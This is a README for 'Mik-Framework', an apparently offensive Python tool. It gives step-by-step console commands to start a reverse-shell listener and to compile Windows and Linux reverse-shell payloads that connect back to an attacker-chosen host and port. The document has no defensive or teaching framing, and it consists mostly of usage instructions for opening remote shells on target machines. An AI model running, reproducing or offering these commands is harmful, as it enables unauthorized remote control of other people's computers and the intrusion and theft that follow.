# Mik-Framework

Mik-Framework is a Python tool for starting a reverse shell server and compiling payloads for Windows and Linux.

## Usage

To start the reverse shell server, run the following command:

```~/Mik-Framework $ python3 mikconsole.py```

This will open the Mik-Framework console, where you can interact with the available modules. To start the reverse shell server, follow these steps:

1. Select the revshell module:
   ```mik> use revshell```

2.  Configure the host and port:
```
mik-revshell> set host 0.0.0.0
mik-revshell> set port 4545
```

4. Run the server:
   ```mik-revshell> run```

## Payload Compilation

### Windows

To compile a payload for Windows, use the following command:

```python3 nous.py -p windows_revshell --host 127.0.0.1 --port 4545 -o payload.c --mingw```

### Linux

To compile a payload for Linux, use the following command:

```python3 nous.py -p linux_revshell --host 127.0.0.1 --port 4545 -o payload.c```

Make sure to replace 127.0.0.1 with the IP address of your server and 4545 with the port you want to use.

## Creating New Modules

You can create new modules to extend the functionality of Mik-Framework. Simply follow the existing module structure and integrate it into the framework.
